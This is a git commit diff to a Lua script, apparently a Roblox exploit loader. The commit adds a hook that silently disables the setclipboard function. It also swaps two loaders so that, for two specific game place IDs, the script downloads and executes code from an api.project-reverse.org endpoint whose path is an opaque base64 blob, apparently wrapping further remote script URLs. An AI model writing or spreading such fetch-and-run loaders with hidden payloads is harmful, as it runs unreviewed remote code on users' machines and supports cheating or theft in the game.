4570675beae58b26be4d2ddc0170b346381e1930
leonix <furkan62.bakir@gmail.com>
2026-06-18 23:49:42 +0300

    Update flashzaml.lua

--- flashzaml.lua
+++ flashzaml.lua
@@ -1,7 +1,9 @@
+pcall(hookfunction, setclipboard, function() return end)
+
 local placeId = game.PlaceId
 
 if placeId == 920587237 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/furqwk/vss/refs/heads/main/viss2.lua"))()
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHV4aW4yNi92aXN1YWwvcmVmcy9oZWFkcy9tYWluL2Fkb3B0bWUubHVhIn19"))()
 elseif placeId == 142823291 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/furqwk/vss/refs/heads/main/vis.lua"))()
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHV4aW4yNi92aXN1YWwvcmVmcy9oZWFkcy9tYWluL21tMi5sdWEifX0"))()
 end
